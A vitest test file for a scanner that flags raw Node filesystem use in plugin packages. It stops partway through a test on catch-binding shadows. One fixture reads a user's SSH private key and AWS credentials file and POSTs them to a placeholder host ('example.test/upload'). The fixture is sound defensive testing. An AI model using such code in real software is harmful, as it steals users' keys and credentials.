/* @vitest-environment node */
import { describe, expect, it } from "vitest";
import {
  PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES,
  buildPackageDryRunFilesystemEvidence,
  runPackageDryRunFilesystemScan,
  scanPackageDryRunFilesystemContent,
} from "./packageDryRunFilesystemScan";

describe("packageDryRunFilesystemScan", () => {
  it("builds bounded deterministic evidence for raw fs and fs-safe findings", () => {
    const longEvidence = [
      "import fs from 'node:fs';",
      "const raw = fs.readFileSync('/Users/example/.ssh/id_rsa', 'utf8');",
      "fetch('https://example.test/upload', { method: 'POST', body: raw });",
      "const more = fs.readFileSync('/Users/example/.aws/credentials', 'utf8');",
    ].join("\n");

    const summary = buildPackageDryRunFilesystemEvidence(
      [
        {
          code: PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.FS_SAFE_USAGE,
          severity: "info",
          file: "src/safe.ts",
          line: 20,
          message: "Uses dry-run fs-safe path handling.",
          evidence: "const target = resolveDryRunPath(args.path);",
        },
        {
          code: PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.RAW_FS_USAGE,
          severity: "warn",
          file: "src/raw-b.ts",
          line: 9,
          message: "Uses raw filesystem access.",
          evidence: "fs.writeFileSync('/tmp/out', value);",
        },
        {
          code: PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.RAW_FS_USAGE,
          severity: "warn",
          file: "src/raw-a.ts",
          line: 3,
          message: "Reads a local credential path.",
          evidence: longEvidence,
        },
        {
          code: "suspicious.unrelated",
          severity: "warn",
          file: "src/network.ts",
          line: 1,
          message: "Network finding.",
          evidence: "fetch('https://example.test')",
        },
        {
          code: PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.RAW_FS_USAGE,
          severity: "warn",
          file: "src/raw-c.ts",
          line: 40,
          message: "Uses raw filesystem access.",
          evidence: "fs.rmSync('/tmp/out', { recursive: true });",
        },
      ],
      { maxEvidenceItems: 2, maxEvidenceChars: 48 },
    );

    expect(summary.rawFsUsage).toEqual({
      totalCount: 3,
      returnedCount: 2,
      omittedCount: 1,
      truncatedEvidenceCount: 1,
      reasonCode: PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.RAW_FS_USAGE,
      evidence: [
        {
          code: PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.RAW_FS_USAGE,
          severity: "warn",
          file: "src/raw-a.ts",
          line: 3,
          message: "Reads a local credential path.",
          evidence: "import fs from 'node:fs';\nconst raw = fs.read...",
          evidenceTruncated: true,
        },
        {
          code: PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.RAW_FS_USAGE,
          severity: "warn",
          file: "src/raw-b.ts",
          line: 9,
          message: "Uses raw filesystem access.",
          evidence: "fs.writeFileSync('/tmp/out', value);",
          evidenceTruncated: false,
        },
      ],
    });
    expect(summary.fsSafeUsage).toEqual({
      totalCount: 1,
      returnedCount: 1,
      omittedCount: 0,
      truncatedEvidenceCount: 0,
      reasonCode: PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.FS_SAFE_USAGE,
      evidence: [
        {
          code: PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.FS_SAFE_USAGE,
          severity: "info",
          file: "src/safe.ts",
          line: 20,
          message: "Uses dry-run fs-safe path handling.",
          evidence: "const target = resolveDryRunPath(args.path);",
          evidenceTruncated: false,
        },
      ],
    });
  });

  it("bounds accumulated evidence while counting every finding during storage scans", async () => {
    const content = Array.from(
      { length: 12 },
      (_, index) => `const fs${index} = require('node:fs');`,
    ).join("\n");
    const storage = {
      get: async () => ({
        size: content.length,
        text: async () => content,
      }),
    };

    const summary = await runPackageDryRunFilesystemScan({ storage } as never, {
      files: [
        {
          path: "dist/many.js",
          storageId: "storage:many",
          size: content.length,
          contentType: "application/javascript",
        },
      ],
    });

    expect(summary.rawFsUsage.totalCount).toBe(12);
    expect(summary.rawFsUsage.returnedCount).toBe(5);
    expect(summary.rawFsUsage.omittedCount).toBe(7);
    expect(summary.rawFsUsage.evidence.map((item) => item.line)).toEqual([1, 2, 3, 4, 5]);
  });

  it("detects raw fs usage and fs-safe usage from plugin code content", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/index.js",
      [
        "import { writeFile } from 'node:fs/promises';",
        "import { writeFileWithinRoot } from '@openclaw/fs-safe';",
        "await writeFile('/tmp/example', payload);",
        "await writeFileWithinRoot(root, 'example.txt', payload);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.code)).toEqual([
      PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.RAW_FS_USAGE,
      PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.FS_SAFE_USAGE,
      PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.RAW_FS_USAGE,
      PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.FS_SAFE_USAGE,
    ]);
  });

  it("detects raw fs and fs-safe usage on the same line", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/index.js",
      "import fs from 'node:fs'; import { readFileWithinRoot } from '@openclaw/fs-safe';",
    );

    expect(findings.map((finding) => finding.code)).toEqual([
      PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.RAW_FS_USAGE,
      PACKAGE_DRY_RUN_FILESYSTEM_REASON_CODES.FS_SAFE_USAGE,
    ]);
  });

  it("does not count comments or string literals as filesystem usage", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/comments.js",
      [
        "// import fs from 'node:fs';",
        "const docs = \"fs.readFileSync('/tmp/example') and @openclaw/fs-safe\";",
        "/* const fs = require('node:fs'); */",
        "const rawPattern = /fs\\.readFileSync\\('/;",
        "const safePattern = /@openclaw\\/fs-safe/;",
        "function rawPattern() { return /fs\\.readFileSync/; }",
        "function safePattern() { return /@openclaw\\/fs-safe/; }",
        "function throwPattern() { throw /fs\\.readFileSync/; }",
        "if (ok) /fs\\.readFileSync/.test(source);",
        "const fs = makeVirtualFilesystem();",
        "fs.readFile('/virtual/file');",
      ].join("\n"),
    );

    expect(findings).toHaveLength(0);
  });

  it("keeps real evidence while ignoring string and comment lookalikes", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/real-and-lookalike.js",
      [
        "import fs from 'node:fs';",
        "import { readFileWithinRoot } from '@openclaw/fs-safe';",
        "const docs = \"fs.readFileSync('/tmp/example') and readFileWithinRoot\";",
        "// fs.writeFileSync('/tmp/example', payload);",
        "fs.readFileSync('/tmp/real');",
        "await readFileWithinRoot(root, 'real.txt');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "import { readFileWithinRoot } from '@openclaw/fs-safe';",
      "fs.readFileSync('/tmp/real');",
      "await readFileWithinRoot(root, 'real.txt');",
    ]);
  });

  it("only counts fs-safe helper calls when they come from fs-safe modules", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/fs-safe-origin.js",
      [
        "const readFileWithinRoot = makeLocalHelper();",
        "readFileWithinRoot('/virtual/local');",
        "import { readFileWithinRoot as readSafe } from '@openclaw/fs-safe';",
        "import * as safeRuntime from 'openclaw/plugin-sdk/security-runtime';",
        "const safeModule = require('openclaw/plugin-sdk/file-access-runtime');",
        "const { writeFileWithinRoot: writeSafe } = safeModule;",
        "const sanitize = safeRuntime.sanitizeUntrustedFileName;",
        "await readSafe(root, 'real.txt');",
        "await writeSafe(root, 'out.txt', payload);",
        "sanitize(userInput);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import { readFileWithinRoot as readSafe } from '@openclaw/fs-safe';",
      "import * as safeRuntime from 'openclaw/plugin-sdk/security-runtime';",
      "const safeModule = require('openclaw/plugin-sdk/file-access-runtime');",
      "const sanitize = safeRuntime.sanitizeUntrustedFileName;",
      "await readSafe(root, 'real.txt');",
      "await writeSafe(root, 'out.txt', payload);",
      "sanitize(userInput);",
    ]);
  });

  it("detects fs-safe helper aliases after earlier declarators", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/fs-safe-comma.js",
      [
        "import * as safeRuntime from '@openclaw/fs-safe';",
        "const noop = 0, readSafe = safeRuntime.readFileWithinRoot, { writeFileWithinRoot: writeSafe } = safeRuntime;",
        "await readSafe(root, 'in.txt');",
        "await writeSafe(root, 'out.txt', payload);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import * as safeRuntime from '@openclaw/fs-safe';",
      "const noop = 0, readSafe = safeRuntime.readFileWithinRoot, { writeFileWithinRoot: writeSafe } = safeRuntime;",
      "await readSafe(root, 'in.txt');",
      "await writeSafe(root, 'out.txt', payload);",
    ]);
  });

  it("detects filesystem calls inside template literal interpolation", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/template.js",
      [
        "import fs from 'node:fs';",
        "const rendered = `raw ${fs.readFileSync('/tmp/example', 'utf8')}`;",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "const rendered = `raw ${fs.readFileSync('/tmp/example', 'utf8')}`;",
    ]);
  });

  it("does not count type-only fs imports as raw fs usage", () => {
    const typeOnlyImportFindings = scanPackageDryRunFilesystemContent(
      "src/index.mts",
      "import type { Stats } from 'node:fs';\ntype PluginStats = Stats;",
    );
    const namedTypeImportFindings = scanPackageDryRunFilesystemContent(
      "src/index.cts",
      "import { type Stats, type Dirent } from 'node:fs';\ntype PluginStats = Stats;",
    );
    const importEqualsTypeFindings = scanPackageDryRunFilesystemContent(
      "src/index.ts",
      "import type fs = require('node:fs');\ntype Reader = typeof fs.readFileSync;",
    );
    const namespaceTypeImportFindings = scanPackageDryRunFilesystemContent(
      "src/index.ts",
      "import type * as fs from 'node:fs';\ntype Reader = typeof fs.readFileSync;",
    );

    expect(typeOnlyImportFindings).toHaveLength(0);
    expect(namedTypeImportFindings).toHaveLength(0);
    expect(importEqualsTypeFindings).toHaveLength(0);
    expect(namespaceTypeImportFindings).toHaveLength(0);
  });

  it("detects raw fs re-exports while ignoring type-only re-exports", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "src/reexports.ts",
      [
        "export type { Stats } from 'node:fs';",
        "export { type Dirent } from 'node:fs';",
        "export { readFile } from 'node:fs/promises';",
        "export * as fs from 'node:fs';",
        "export * from 'fs/promises';",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "export { readFile } from 'node:fs/promises';",
      "export * as fs from 'node:fs';",
      "export * from 'fs/promises';",
    ]);
  });

  it("detects multiline raw fs imports and re-exports", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "src/multiline-reexports.ts",
      [
        "export type {",
        "  Stats,",
        "} from 'node:fs';",
        "export {",
        "  readFile,",
        "} from 'node:fs/promises';",
        "import {",
        "  writeFile,",
        "} from 'node:fs/promises';",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "export {\n  readFile,\n} from 'node:fs/promises';",
      "import {\n  writeFile,\n} from 'node:fs/promises';",
    ]);
  });

  it("detects optional-chained raw fs calls", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/optional-chain.js",
      [
        "import fs from 'node:fs';",
        "import { readFile } from 'node:fs/promises';",
        "fs?.readFileSync('/tmp/example');",
        "await fs.promises?.readFile('/tmp/example');",
        "await fs?.promises?.writeFile('/tmp/example', payload);",
        "await readFile?.('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "import { readFile } from 'node:fs/promises';",
      "fs?.readFileSync('/tmp/example');",
      "await fs.promises?.readFile('/tmp/example');",
      "await fs?.promises?.writeFile('/tmp/example', payload);",
      "await readFile?.('/tmp/example');",
    ]);
  });

  it("detects real fs imports on the same line as type-only fs imports", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "src/mixed-type-import.js",
      "import type fsTypes = require('node:fs'); import { type Stats } from 'node:fs'; const fs = require('node:fs'); fs.readFileSync('/tmp/example');",
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import type fsTypes = require('node:fs'); import { type Stats } from 'node:fs'; const fs = require('node:fs'); fs.readFileSync('/tmp/example');",
    ]);
  });

  it("detects raw fs read and query APIs, not just mutating APIs", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/index.js",
      [
        "const fs = require('node:fs');",
        "const raw = fs.readFileSync('/tmp/example', 'utf8');",
        "const entries = await fs.promises.readdir('/tmp');",
        "const stream = fs.createReadStream('/tmp/example');",
        "const exists = fs.existsSync('/tmp/example');",
        "await fs.promises.copyFile('/tmp/a', '/tmp/b');",
        "await fs.promises.realpath('/tmp/example');",
        "await fs.promises.readlink('/tmp/link');",
        "await fs.promises.chmod('/tmp/example', 0o600);",
        "await fs.promises.chown('/tmp/example', uid, gid);",
        "await fs.promises.utimes('/tmp/example', now, now);",
        "fs.watch('/tmp/example', () => {});",
        "await fs.promises.mkdtemp('/tmp/plugin-');",
        "await fs.promises.truncate('/tmp/example', 0);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "const fs = require('node:fs');",
      "const raw = fs.readFileSync('/tmp/example', 'utf8');",
      "const entries = await fs.promises.readdir('/tmp');",
      "const stream = fs.createReadStream('/tmp/example');",
      "const exists = fs.existsSync('/tmp/example');",
      "await fs.promises.copyFile('/tmp/a', '/tmp/b');",
      "await fs.promises.realpath('/tmp/example');",
      "await fs.promises.readlink('/tmp/link');",
      "await fs.promises.chmod('/tmp/example', 0o600);",
      "await fs.promises.chown('/tmp/example', uid, gid);",
      "await fs.promises.utimes('/tmp/example', now, now);",
      "fs.watch('/tmp/example', () => {});",
      "await fs.promises.mkdtemp('/tmp/plugin-');",
      "await fs.promises.truncate('/tmp/example', 0);",
    ]);
  });

  it("detects namespace aliases for raw fs APIs", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/index.mjs",
      [
        "import * as nodeFs from 'node:fs';",
        "import filesystem from 'node:fs/promises';",
        "import { default as defaultFs } from 'node:fs';",
        "import tsFs = require('node:fs');",
        "const requiredFs = require('node:fs');",
        "const importedFs = await import('node:fs/promises');",
        "const promisedFs = require('node:fs').promises;",
        "const promisedFromAlias = defaultFs.promises;",
        "nodeFs.readFileSync('/tmp/example', 'utf8');",
        "await nodeFs.promises.readdir('/tmp');",
        "await filesystem.writeFile('/tmp/example', payload);",
        "defaultFs.rmSync('/tmp/example');",
        "tsFs.statSync('/tmp/example');",
        "requiredFs.createReadStream('/tmp/example');",
        "await importedFs.rm('/tmp/example');",
        "await promisedFs.readFile('/tmp/example', 'utf8');",
        "await promisedFromAlias.writeFile('/tmp/example', payload);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import * as nodeFs from 'node:fs';",
      "import filesystem from 'node:fs/promises';",
      "import { default as defaultFs } from 'node:fs';",
      "import tsFs = require('node:fs');",
      "const requiredFs = require('node:fs');",
      "const importedFs = await import('node:fs/promises');",
      "const promisedFs = require('node:fs').promises;",
      "nodeFs.readFileSync('/tmp/example', 'utf8');",
      "await nodeFs.promises.readdir('/tmp');",
      "await filesystem.writeFile('/tmp/example', payload);",
      "defaultFs.rmSync('/tmp/example');",
      "tsFs.statSync('/tmp/example');",
      "requiredFs.createReadStream('/tmp/example');",
      "await importedFs.rm('/tmp/example');",
      "await promisedFs.readFile('/tmp/example', 'utf8');",
      "await promisedFromAlias.writeFile('/tmp/example', payload);",
    ]);
  });

  it("detects calls through direct raw fs member aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/member-alias.js",
      [
        "import fs from 'node:fs';",
        "const readSync = fs.readFileSync;",
        "const read = fs.promises.readFile;",
        "const write = require('node:fs/promises').writeFile;",
        "readSync('/tmp/example', 'utf8');",
        "await read('/tmp/example', 'utf8');",
        "await write('/tmp/example', payload);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "const readSync = fs.readFileSync;",
      "const read = fs.promises.readFile;",
      "const write = require('node:fs/promises').writeFile;",
      "readSync('/tmp/example', 'utf8');",
      "await read('/tmp/example', 'utf8');",
      "await write('/tmp/example', payload);",
    ]);
  });

  it("detects calls through direct raw fs member aliases after earlier declarators", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/member-alias-comma.js",
      [
        "import fs from 'node:fs';",
        "const noop = 0, readSync = fs.readFileSync, read = fs.promises.readFile;",
        "readSync('/tmp/example', 'utf8');",
        "await read('/tmp/example', 'utf8');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "const noop = 0, readSync = fs.readFileSync, read = fs.promises.readFile;",
      "readSync('/tmp/example', 'utf8');",
      "await read('/tmp/example', 'utf8');",
    ]);
  });

  it("detects promises namespace aliases from destructured fs imports", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/index.mjs",
      [
        "import { promises as fs } from 'node:fs';",
        "const { promises: fsp } = require('node:fs');",
        "import { promises } from 'node:fs';",
        "await fs.readFile('/tmp/example', 'utf8');",
        "await fsp.writeFile('/tmp/example', payload);",
        "await promises.rm('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import { promises as fs } from 'node:fs';",
      "const { promises: fsp } = require('node:fs');",
      "import { promises } from 'node:fs';",
      "await fs.readFile('/tmp/example', 'utf8');",
      "await fsp.writeFile('/tmp/example', payload);",
      "await promises.rm('/tmp/example');",
    ]);
  });

  it("detects combined default and named fs imports", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/index.mjs",
      [
        "import nodeFs, { readFile as rf } from 'node:fs';",
        "import otherFs, { promises as fsp } from 'node:fs';",
        "nodeFs.readFileSync('/tmp/a');",
        "await rf('/tmp/b');",
        "await fsp.readFile('/tmp/c');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import nodeFs, { readFile as rf } from 'node:fs';",
      "import otherFs, { promises as fsp } from 'node:fs';",
      "nodeFs.readFileSync('/tmp/a');",
      "await rf('/tmp/b');",
      "await fsp.readFile('/tmp/c');",
    ]);
  });

  it("does not flag local fs-shaped objects as raw Node fs calls", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/virtual.js",
      [
        "const fs = makeVirtualFilesystem();",
        "const fsPromises = makeVirtualPromises();",
        "await fs.readFile('/virtual/file');",
        "await fsPromises.writeFile('/virtual/file', value);",
      ].join("\n"),
    );

    expect(findings).toHaveLength(0);
  });

  it("detects common destructured fs APIs", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/index.js",
      [
        "import { existsSync, copyFile, realpath, readlink, chmod, chown, utimes, watch, mkdtemp, truncate } from 'node:fs';",
        "if (existsSync('/tmp/example')) watch('/tmp/example', () => {});",
        "await copyFile('/tmp/a', '/tmp/b');",
        "await realpath('/tmp/example');",
        "await readlink('/tmp/link');",
        "await chmod('/tmp/example', 0o600);",
        "await chown('/tmp/example', uid, gid);",
        "await utimes('/tmp/example', now, now);",
        "await mkdtemp('/tmp/plugin-');",
        "await truncate('/tmp/example', 0);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import { existsSync, copyFile, realpath, readlink, chmod, chown, utimes, watch, mkdtemp, truncate } from 'node:fs';",
      "if (existsSync('/tmp/example')) watch('/tmp/example', () => {});",
      "await copyFile('/tmp/a', '/tmp/b');",
      "await realpath('/tmp/example');",
      "await readlink('/tmp/link');",
      "await chmod('/tmp/example', 0o600);",
      "await chown('/tmp/example', uid, gid);",
      "await utimes('/tmp/example', now, now);",
      "await mkdtemp('/tmp/plugin-');",
      "await truncate('/tmp/example', 0);",
    ]);
  });

  it("detects destructured fs helpers from promises aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/index.js",
      [
        "const fs = require('node:fs');",
        "const { readFile, writeFile: wf } = require('node:fs').promises;",
        "let { rm } = fs.promises;",
        "var { cp } = require('node:fs/promises');",
        "await readFile('/tmp/example', 'utf8');",
        "await wf('/tmp/example', payload);",
        "await rm('/tmp/example');",
        "await cp('/tmp/a', '/tmp/b');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "const fs = require('node:fs');",
      "const { readFile, writeFile: wf } = require('node:fs').promises;",
      "var { cp } = require('node:fs/promises');",
      "await readFile('/tmp/example', 'utf8');",
      "await wf('/tmp/example', payload);",
      "await rm('/tmp/example');",
      "await cp('/tmp/a', '/tmp/b');",
    ]);
  });

  it("detects destructured fs helpers with default initializers", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/defaulted-destructure.js",
      [
        "const { readFile = fallbackRead, writeFile: wf = fallbackWrite } = require('node:fs/promises');",
        "await readFile('/tmp/example', 'utf8');",
        "await wf('/tmp/example', payload);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "const { readFile = fallbackRead, writeFile: wf = fallbackWrite } = require('node:fs/promises');",
      "await readFile('/tmp/example', 'utf8');",
      "await wf('/tmp/example', payload);",
    ]);
  });

  it("detects destructured helpers from namespace fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/index.js",
      [
        "import * as fs from 'node:fs';",
        "const { readFileSync, writeFile: wf } = fs;",
        "const { copyFileSync } = (fs);",
        "const { promises: fsp } = fs;",
        "const { promises: { readFile: readPromised, writeFile } } = fs;",
        "readFileSync('/tmp/example', 'utf8');",
        "copyFileSync('/tmp/a', '/tmp/b');",
        "await wf('/tmp/example', payload);",
        "await fsp.readFile('/tmp/promised', 'utf8');",
        "await readPromised('/tmp/nested', 'utf8');",
        "await writeFile('/tmp/nested', payload);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import * as fs from 'node:fs';",
      "readFileSync('/tmp/example', 'utf8');",
      "copyFileSync('/tmp/a', '/tmp/b');",
      "await wf('/tmp/example', payload);",
      "await fsp.readFile('/tmp/promised', 'utf8');",
      "await readPromised('/tmp/nested', 'utf8');",
      "await writeFile('/tmp/nested', payload);",
    ]);
  });

  it("detects destructured raw fs helper aliases after earlier declarators", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/destructured-comma.js",
      [
        "import fs from 'node:fs';",
        "const noop = 0, { writeFile, readFile: rf } = fs.promises;",
        "await writeFile('/tmp/example', payload);",
        "await rf('/tmp/example', 'utf8');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "await writeFile('/tmp/example', payload);",
      "await rf('/tmp/example', 'utf8');",
    ]);
  });

  it("detects calls through raw fs aliases introduced by parameter defaults", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/parameter-default-raw-fs.js",
      [
        "function load(",
        "  fs = require('node:fs'),",
        ") {",
        "  return fs.readFileSync('/tmp/example', 'utf8');",
        "}",
        "fs.readFile('/virtual/file');",
        "function inspect({ fs = require('node:fs') }) {",
        "  return fs.readFileSync('/tmp/destructured', 'utf8');",
        "}",
        "const inspectRenamed = ({ local: fs = require('node:fs') }) =>",
        "  fs.readFileSync('/tmp/renamed', 'utf8');",
        "const inspectObject = (",
        "  fs = require('node:fs'),",
        "): { value: string } =>",
        "  ({",
        "    value: fs.readFileSync('/tmp/object', 'utf8'),",
        "  });",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "fs = require('node:fs'),",
      "return fs.readFileSync('/tmp/example', 'utf8');",
      "function inspect({ fs = require('node:fs') }) {",
      "return fs.readFileSync('/tmp/destructured', 'utf8');",
      "const inspectRenamed = ({ local: fs = require('node:fs') }) =>",
      "fs.readFileSync('/tmp/renamed', 'utf8');",
      "fs = require('node:fs'),",
      "value: fs.readFileSync('/tmp/object', 'utf8'),",
    ]);
  });

  it("detects calls through raw fs helper aliases introduced by destructured parameter defaults", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/parameter-default-raw-fs-helper.js",
      [
        "function load({ readFile = require('node:fs/promises').readFile }) {",
        "  return readFile('/tmp/example', 'utf8');",
        "}",
        "const write = (",
        "  { helper = require('node:fs').promises.writeFile },",
        ") => helper('/tmp/example', payload);",
        "import fs from 'node:fs';",
        "function stat({ helper = fs.promises.stat }) {",
        "  return helper('/tmp/stat');",
        "}",
        "function local({ readFile = fallbackRead }) {",
        "  return readFile('/virtual/file');",
        "}",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "function load({ readFile = require('node:fs/promises').readFile }) {",
      "return readFile('/tmp/example', 'utf8');",
      "{ helper = require('node:fs').promises.writeFile },",
      ") => helper('/tmp/example', payload);",
      "import fs from 'node:fs';",
      "function stat({ helper = fs.promises.stat }) {",
      "return helper('/tmp/stat');",
    ]);
  });

  it("does not flag same-line function parameters that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed.js",
      [
        "import fs from 'node:fs';",
        "import { readFile } from 'node:fs/promises';",
        "function inspect(fs) { return fs.readFile('/virtual/file'); }",
        "function load(readFile) { return readFile('/virtual/file'); }",
        "const read = (fs) => fs.readFile('/virtual/file');",
        "const write = fs => fs.writeFile('/virtual/file', value);",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "import { readFile } from 'node:fs/promises';",
    ]);
  });

  it("detects raw fs usage inside parameter defaults and destructuring that do not bind fs", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/parameter-defaults.js",
      [
        "import fs from 'node:fs';",
        "function load(path = fs.readFileSync('/tmp/default')) { return path; }",
        "function inspect({ fs: local }) { return fs.readFileSync('/tmp/outer'); }",
        "function shadow({ local: fs }) { return fs.readFile('/virtual/file'); }",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "function load(path = fs.readFileSync('/tmp/default')) { return path; }",
      "function inspect({ fs: local }) { return fs.readFileSync('/tmp/outer'); }",
    ]);
  });

  it("detects raw fs calls that appear before a same-line shadow declaration", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/call-before-shadow.js",
      [
        "import fs from 'node:fs';",
        "fs.readFileSync('/tmp/real'); function inspect(fs) { return fs.readFile('/virtual/file'); }",
        "fs.writeFileSync('/tmp/typed-real'); const typed = (fs: VirtualFilesystem): string => fs.readFile('/virtual/typed');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/real'); function inspect(fs) { return fs.readFile('/virtual/file'); }",
      "fs.writeFileSync('/tmp/typed-real'); const typed = (fs: VirtualFilesystem): string => fs.readFile('/virtual/typed');",
    ]);
  });

  it("detects raw fs calls that appear after same-line block-local shadows", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/call-after-block-shadow.js",
      [
        "import fs from 'node:fs';",
        "import { readFile } from 'node:fs/promises';",
        "{ const fs = makeVirtualFilesystem(); fs.readFile('/virtual/inline'); } fs.readFileSync('/tmp/real');",
        "if (useVirtual) { const fs = makeVirtualFilesystem(); fs.readFile('/virtual/if'); }",
        "fs.writeFileSync('/tmp/after-if', value);",
        "{ const { readFile } = makeVirtualFilesystem(); readFile('/virtual/inline'); } await readFile('/tmp/real');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "import { readFile } from 'node:fs/promises';",
      "{ const fs = makeVirtualFilesystem(); fs.readFile('/virtual/inline'); } fs.readFileSync('/tmp/real');",
      "fs.writeFileSync('/tmp/after-if', value);",
      "{ const { readFile } = makeVirtualFilesystem(); readFile('/virtual/inline'); } await readFile('/tmp/real');",
    ]);
  });

  it("does not flag block-local declarations that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-block.js",
      [
        "import fs from 'node:fs';",
        "{ const fs = makeVirtualFilesystem(); fs.readFile('/virtual/inline'); }",
        "{ const other = 1, localFs = makeVirtualFilesystem(), fs = makeVirtualFilesystem(); fs.readFile('/virtual/comma'); }",
        "{ const other = 1; const fs = makeVirtualFilesystem(); fs.readFile('/virtual/semicolon'); }",
        "{",
        "  const fs = makeVirtualFilesystem();",
        "  fs.readFile('/virtual/file');",
        "}",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag typed destructured parameters that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-typed-destructuring.ts",
      [
        "import fs from 'node:fs';",
        "function inspect({ fs }: { fs: VirtualFilesystem }) { return fs.readFile('/virtual/file'); }",
        "const load = ({ fs }: { fs: VirtualFilesystem }) => fs.readFile('/virtual/file');",
        "fs.readFileSync('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import fs from 'node:fs';",
      "fs.readFileSync('/tmp/example');",
    ]);
  });

  it("does not flag block-local function declarations that shadow destructured helpers", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/shadowed-function-declaration.js",
      [
        "import { readFile } from 'node:fs/promises';",
        "{",
        "  function readFile() { return 'virtual'; }",
        "  readFile('/virtual/file');",
        "}",
        "await readFile('/tmp/example');",
      ].join("\n"),
    );

    expect(findings.map((finding) => finding.evidence)).toEqual([
      "import { readFile } from 'node:fs/promises';",
      "await readFile('/tmp/example');",
    ]);
  });

  it("does not flag catch bindings that shadow fs aliases", () => {
    const findings = scanPackageDryRunFilesystemContent(
      "dist/catch-shadow.js",
      [
        "import fs from 'node:fs';",
        "try {",
        "  runPlugin();",
